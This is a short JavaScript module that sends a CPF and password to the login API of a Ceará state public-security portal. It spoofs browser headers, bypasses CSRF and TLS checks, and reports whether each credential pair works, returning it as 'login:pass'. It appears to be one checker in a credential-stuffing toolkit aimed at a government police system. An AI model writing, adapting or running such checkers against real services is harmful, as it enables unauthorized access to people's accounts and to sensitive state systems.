import axios from "axios";
import https from 'https'

export default async function serebrumSe(login, pass) {

  const url = 'https://spi.sspds.ce.gov.br/api/siaa/auth'
  const headers= {
    'Accept': 'application/json',
    'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json;charset=UTF-8',
    'Csrf-Token': 'nocheck',
    'Origin': 'https://spi.sspds.ce.gov.br',
    'Referer': 'https://spi.sspds.ce.gov.br/oauth2/index.html',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    'X-Requested-With': '*',
    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"'
  }
  
  const dataRequest = {"cpf":login,"password":pass,"appServerKey":"46dff8f1542d243a069b86eb95d5108e11a67455"};

  const { data } = await axios({
    method: "POST",
    headers: headers,
    data: dataRequest,
    url: url,
    validateStatus: () => true,
    httpsAgent: new https.Agent({  
        rejectUnauthorized: false 
      }),

  });

  
  if (data.message == "Não foi possível fazer o login. Verifique se suas credenciais estão corretas e tente outra vez.")
    return {
      success: false,
      login: login + ":" + pass,
      uri: url,
    };
  return {
    success: true,
    login: login + ":" + pass,
    uri: url,
  };
}

